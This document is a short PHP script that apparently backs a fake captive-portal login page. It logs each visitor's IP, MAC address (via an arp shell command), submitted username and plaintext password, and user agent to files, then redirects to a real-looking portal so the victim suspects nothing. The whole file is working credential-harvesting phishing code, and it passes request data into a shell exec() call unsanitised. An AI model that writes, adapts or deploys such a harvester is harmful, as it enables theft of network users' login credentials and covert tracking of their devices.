<?php
	$file = '../log.txt';
	$output=null;
	$retval=null;
	$ip = $_SERVER['REMOTE_ADDR'];
	exec("arp -a | grep $ip | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'", $output, $retval);
	$current_date = date("Y-m-d-H-i-s");
	$fileopen=(fopen("$file",'a'));
	fwrite($fileopen,$current_date);
	fwrite($fileopen," | IP : ");
	fwrite($fileopen,$_SERVER['REMOTE_ADDR']);
	fwrite($fileopen,"\tMAC : ");
	fwrite($fileopen,$output[0]);
	fwrite($fileopen,"\tLogin : ");
	fwrite($fileopen,$_POST['login']);
	fwrite($fileopen,"\tPassword : ");
	fwrite($fileopen,$_POST['password']);
	fwrite($fileopen,"\tMachine : ");
	fwrite($fileopen,$_SERVER['HTTP_USER_AGENT']);
	fwrite($fileopen,"\n");
	fclose($fileopen);
	$file = '../id.txt';
	$fileopen = (fopen("$file",w));
	fwrite($fileopen, $_POST['login']);
	fwrite($fileopen, "\n");
	fwrite($fileopen, $_POST['password']);
	fclose($fileopen);
 ?><meta http-equiv='refresh' content='0; url=http://portail.captif-u.com/index.php?login=<?php echo $_POST['login'] ?>' />
